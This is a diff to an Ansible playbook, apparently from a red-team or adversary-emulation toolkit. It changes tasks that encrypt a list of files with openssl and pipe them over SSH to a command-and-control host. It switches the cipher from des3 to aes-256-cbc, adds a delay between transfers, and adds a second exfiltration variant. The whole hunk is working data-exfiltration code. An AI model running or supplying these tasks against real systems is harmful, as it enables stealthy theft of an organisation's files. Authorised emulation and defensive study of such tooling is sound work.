@@ -25,10 +25,18 @@
       tags: always 
       debug:
         msg="{{ exfil_files_list.stdout_lines }}"
-    - name: Exfil over SSH
-      tags: always
+    - name: Exfil over SSH-TAR
+      tags: SSH-TAR
       shell: |
-        tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'
+        tar czpf - {{ item }} | openssl aes-256-cbc -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'
+        sleep {{ exfil_delay }}
+      with_items: "{{ exfil_files_list.stdout_lines }}"
+      args:
+        chdir: "{{ exfiltration_folder }}"
+    - name: Exfil over SSH
+      tags: SSH
+      shell: |
+        openssl aes-256-cbc -salt -k {{ password_encryption }} -in {{ item }} -out - | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'
         sleep {{ exfil_delay }}
       with_items: "{{ exfil_files_list.stdout_lines }}"
       args:
